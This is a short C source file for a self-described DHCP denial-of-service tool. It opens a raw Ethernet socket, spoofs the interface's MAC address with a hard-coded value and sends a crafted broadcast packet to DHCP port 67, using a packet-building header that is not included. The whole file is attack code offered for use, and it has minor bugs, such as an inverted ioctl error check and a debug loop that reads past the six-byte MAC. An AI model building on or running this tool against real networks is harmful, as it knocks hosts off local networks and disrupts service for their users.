/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include "construct_packet.h"

#define ARPHRD_ETHER 	1

int main(int argc,char **argv){

	if(argc!=2){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface>");
		exit(-1);
	}

	//Get a layer 2 socket with raw format. Raw means we want to construct the header of layer 2 packet on our own.
	int sd;
	if((sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("socket()");
		exit(-1);
	}
	
	//get hwaddr of the interface
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,argv[1],IFNAMSIZ);
	//printf("%s\n",itface.ifr_name);
	
	if(ioctl(sd,SIOCGIFHWADDR, &itface) > 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}


#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<6;iii++){
		printf(":%02x",(unsigned char)(itface.ifr_hwaddr.sa_data[iii]));

	}
	printf("\n");
#endif
	

	//modify the mac address
	unsigned char hwmac[6]={0x00,0xe0,0x4c,0x68,0x03,0x73};
	unsigned char dstmac[6]={0x00,0x11,0x4c,0x68,0x03,0x73};
	copy_macaddr(itface.ifr_hwaddr.sa_data,hwmac[0],hwmac[1],hwmac[2],hwmac[3],hwmac[4],hwmac[5]);
	if(ioctl(sd, SIOCSIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCSIFHWADDR)");	
		exit(-1);
	}


#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<8;iii++){
		printf(":%02x",(unsigned char)itface.ifr_hwaddr.sa_data[iii]);

	}
	printf("\n");
#endif


	//get interface index
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	//Bind our file descriptor to this interface.
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);
	if(bind(sd,(struct sockaddr*)&ifaddr,sizeof(struct sockaddr_ll))<0){
		perror("bind()");
		exit(-1);
	}
	
	//start to construct dhcp datagram
	unsigned char packet[PACKETMAXSIZE];
	unsigned int hip=0;
	unsigned int dip;
	inet_pton(AF_INET,"255.255.255.255",&dip);
	
	//Host ip address will be returned in hip.
	construct_udp(67/*dhcp*/,hwmac,dstmac,&hip,&dip,packet);

		


	//Ready to send packet.
	//Specify the interface through which we sent our packet.

	struct sockaddr_ll destifaddr;
	memset(&destifaddr,0,sizeof(struct sockaddr_ll));
	destifaddr.sll_halen=ETH_ALEN;
	destifaddr.sll_ifindex=itface.ifr_ifindex;
	//It seems unnecessary to specify the mac address of destination, for we have write it in the packet we created.
	//copy_macaddr((unsigned char*)destifaddr.sll_addr,0x11,dstmac[1],dstmac[2],dstmac[3],dstmac[4],dstmac[5]);
	
	if(sendto(sd,packet,PACKETMAXSIZE,0,(struct sockaddr*)&destifaddr,sizeof(struct sockaddr_ll))<0){
		perror("sendto()");
		exit(-1);
	}



	return 0;

}
